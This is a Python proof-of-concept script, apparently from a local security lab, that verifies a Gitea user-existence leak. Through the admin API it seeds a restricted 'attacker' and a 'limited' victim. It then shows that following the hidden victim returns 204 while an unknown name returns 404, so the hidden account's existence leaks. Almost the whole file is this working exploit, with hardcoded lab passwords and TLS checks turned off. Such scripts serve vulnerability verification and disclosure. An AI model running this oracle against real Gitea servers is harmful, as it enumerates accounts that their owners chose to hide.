#!/usr/bin/env python3
"""Local oracle for Gitea unpublished Follow 204 vs 404 existence leak.

PUT /api/v1/user/following/{username} uses UserAssignmentAPI only (404 if the
name is unknown) and never calls IsUserVisibleToViewer. GET /users/{username}
does, so a limited user is 404 to a restricted attacker while Follow is 204.

Witness is status-class only (hidden Follow 204, unknown 404). Loopback only.
"""
from __future__ import annotations

import base64
import json
import ssl
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Never

LABEL = "GITEA-FOLLOW-ORACLE"
DEFAULT_BASE = "http://127.0.0.1:18134"
USER_AGENT = "gitea-follow-existence-lab"
HTTP_TIMEOUT_S = 30
SNIPPET_SHORT = 120
SNIPPET_LONG = 160
CREATED_OK = (200, 201)
ALREADY_EXISTS = (409, 422)
FOLLOW_OK = (200, 201, 204)
JSON_VALUE = str | bool | int


@dataclass(frozen=True)
class Config:
    base: str
    admin_user: str = "labadmin"
    admin_password: str = "LabPass123!"
    attacker_user: str = "attacker"
    attacker_password: str = "LabPass123!"
    victim: str = "hiddenlimited"
    public_user: str = "publicprobe"
    unknown_user: str = "no-such-user-xyz"
    password: str = "LabPass123!"
    timeout_s: int = HTTP_TIMEOUT_S

    @property
    def admin(self) -> tuple[str, str]:
        return (self.admin_user, self.admin_password)

    @property
    def attacker(self) -> tuple[str, str]:
        return (self.attacker_user, self.attacker_password)


def config_from_argv(argv: list[str]) -> Config:
    raw = argv[1] if len(argv) > 1 else DEFAULT_BASE
    return Config(base=raw.rstrip("/"))


def fail(message: str) -> Never:
    print(message)
    raise SystemExit(1)


def snippet(body: str, limit: int) -> str:
    return repr(body[:limit])


class GiteaClient:
    def __init__(self, cfg: Config) -> None:
        self._cfg = cfg
        self._ssl = ssl._create_unverified_context()

    def request(
        self,
        method: str,
        path: str,
        data: dict[str, JSON_VALUE] | None = None,
        auth: tuple[str, str] | None = None,
    ) -> tuple[int, str]:
        headers = {
            "Content-Type": "application/json",
            "User-Agent": USER_AGENT,
        }
        if auth is not None:
            token = base64.b64encode(f"{auth[0]}:{auth[1]}".encode("utf-8")).decode("ascii")
            headers["Authorization"] = f"Basic {token}"
        body = None if data is None else json.dumps(data).encode("utf-8")
        req = urllib.request.Request(
            f"{self._cfg.base}{path}",
            data=body,
            headers=headers,
            method=method,
        )
        try:
            with urllib.request.urlopen(
                req,
                timeout=self._cfg.timeout_s,
                context=self._ssl,
            ) as resp:
                return int(resp.status), resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            return int(exc.code), exc.read().decode("utf-8", "replace")


def create_or_patch(
    client: GiteaClient,
    cfg: Config,
    username: str,
    payload: dict[str, JSON_VALUE],
    patch: dict[str, JSON_VALUE],
) -> None:
    status, body = client.request("POST", "/api/v1/admin/users", payload, auth=cfg.admin)
    print(f"IOC create user={username} status={status} snippet={snippet(body, SNIPPET_LONG)}")
    if status in CREATED_OK:
        return
    if status not in ALREADY_EXISTS:
        fail(f"FAIL admin create {username}")
    status, body = client.request(
        "PATCH",
        f"/api/v1/admin/users/{username}",
        patch,
        auth=cfg.admin,
    )
    print(f"IOC patch user={username} status={status} snippet={snippet(body, SNIPPET_LONG)}")
    if status != 200:
        fail(f"FAIL admin patch {username}")


def seed(client: GiteaClient, cfg: Config) -> None:
    status, body = client.request("GET", "/api/v1/user", auth=cfg.admin)
    print(f"IOC admin-self status={status} snippet={snippet(body, SNIPPET_SHORT)}")
    if status != 200:
        fail("FAIL admin login")

    create_or_patch(
        client,
        cfg,
        cfg.victim,
        {
            "username": cfg.victim,
            "email": f"{cfg.victim}@localhost.invalid",
            "password": cfg.password,
            "must_change_password": False,
            "visibility": "limited",
        },
        {"source_id": 0, "visibility": "limited", "must_change_password": False},
    )
    create_or_patch(
        client,
        cfg,
        cfg.attacker_user,
        {
            "username": cfg.attacker_user,
            "email": f"{cfg.attacker_user}@localhost.invalid",
            "password": cfg.password,
            "must_change_password": False,
            "restricted": True,
            "visibility": "public",
        },
        {
            "source_id": 0,
            "restricted": True,
            "visibility": "public",
            "must_change_password": False,
        },
    )
    create_or_patch(
        client,
        cfg,
        cfg.public_user,
        {
            "username": cfg.public_user,
            "email": f"{cfg.public_user}@localhost.invalid",
            "password": cfg.password,
            "must_change_password": False,
            "visibility": "public",
        },
        {"source_id": 0, "visibility": "public", "must_change_password": False},
    )


def main() -> int:
    cfg = config_from_argv(sys.argv)
    client = GiteaClient(cfg)
    print(f"IOC base={cfg.base}")

    status, body = client.request("GET", "/api/v1/version")
    print(f"IOC version status={status} snippet={snippet(body, SNIPPET_SHORT)}")
    if status != 200:
        fail("FAIL version")

    seed(client, cfg)

    status_pub, body_pub = client.request(
        "GET",
        f"/api/v1/users/{cfg.public_user}",
        auth=cfg.attacker,
    )
    print(f"IOC get-public status={status_pub} snippet={snippet(body_pub, SNIPPET_LONG)}")
    if status_pub != 200:
        fail("FAIL restricted attacker cannot see public user")

    status_get, body_get = client.request(
        "GET",
        f"/api/v1/users/{cfg.victim}",
        auth=cfg.attacker,
    )
    print(f"IOC get-hidden status={status_get} snippet={snippet(body_get, SNIPPET_LONG)}")
    if status_get != 404:
        fail("FAIL hidden user profile was visible (expected 404)")

    status_admin, _ = client.request(
        "GET",
        f"/api/v1/users/{cfg.victim}",
        auth=cfg.admin,
    )
    print(f"IOC get-hidden-as-admin status={status_admin}")
    if status_admin != 200:
        fail("FAIL victim does not exist for admin")

    status_hit, body_hit = client.request(
        "PUT",
        f"/api/v1/user/following/{cfg.victim}",
        auth=cfg.attacker,
    )
    print(f"IOC follow-hidden status={status_hit} snippet={snippet(body_hit, SNIPPET_LONG)}")

    status_miss, body_miss = client.request(
        "PUT",
        f"/api/v1/user/following/{cfg.unknown_user}",
        auth=cfg.attacker,
    )
    print(f"IOC follow-unknown status={status_miss} snippet={snippet(body_miss, SNIPPET_LONG)}")

    hidden_ok = status_hit in FOLLOW_OK
    unknown_404 = status_miss == 404
    print(f"IOC oracle hidden={status_hit} unknown={status_miss}")

    if hidden_ok and unknown_404:
        print(f"SUCCESS {LABEL}")
        return 0
    if status_hit == 404 and status_miss == 404:
        fail("FAIL both follow targets 404 (Follow checks visibility or assignment hides)")
    fail(f"FAIL unexpected follow statuses hidden={status_hit} unknown={status_miss}")


if __name__ == "__main__":
    raise SystemExit(main())
